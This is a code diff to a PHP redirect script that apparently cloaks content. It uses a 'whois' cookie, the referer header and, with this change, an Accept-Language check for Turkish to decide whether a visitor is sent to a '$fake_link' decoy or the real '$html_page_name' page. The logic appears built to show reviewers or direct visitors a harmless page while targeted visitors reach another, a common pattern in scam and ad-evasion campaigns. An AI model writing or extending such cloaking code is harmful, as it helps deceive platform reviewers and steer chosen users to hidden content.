@@ -1,4 +1,5 @@
 <?php
+ $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
 $useragent=$_SERVER['HTTP_USER_AGENT'];
 $cookie_name = "whois";
 $host = $_SERVER["HTTP_HOST"];
@@ -25,17 +26,9 @@ if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|c
 
 }else{
 
+    if($lang =="tr"){
 
-    if(!isset($_COOKIE[$cookie_name])){
-        if($_COOKIE[$cookie_name] == "defined"){
-            redirect($html_page_name);
-        }else{
-            setcookie($cookie_name, "undefined", time() + (600 ), "/");
-            redirect($fake_link);
-        }
-    }else{
-
-        if(!isset($http_referer)){
+        if(!isset($_COOKIE[$cookie_name])){
             if($_COOKIE[$cookie_name] == "defined"){
                 redirect($html_page_name);
             }else{
@@ -43,10 +36,24 @@ if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|c
                 redirect($fake_link);
             }
         }else{
-            setcookie($cookie_name, "defined", time() + (600), "/");
-            redirect($html_page_name);
+    
+            if(!isset($http_referer)){
+                if($_COOKIE[$cookie_name] == "defined"){
+                    redirect($html_page_name);
+                }else{
+                    setcookie($cookie_name, "undefined", time() + (600 ), "/");
+                    redirect($fake_link);
+                }
+            }else{
+                setcookie($cookie_name, "defined", time() + (600), "/");
+                redirect($html_page_name);
+            }
+            
         }
-        
+    
+    }else{
+        redirect($html_page_name);
+
     }
 
    
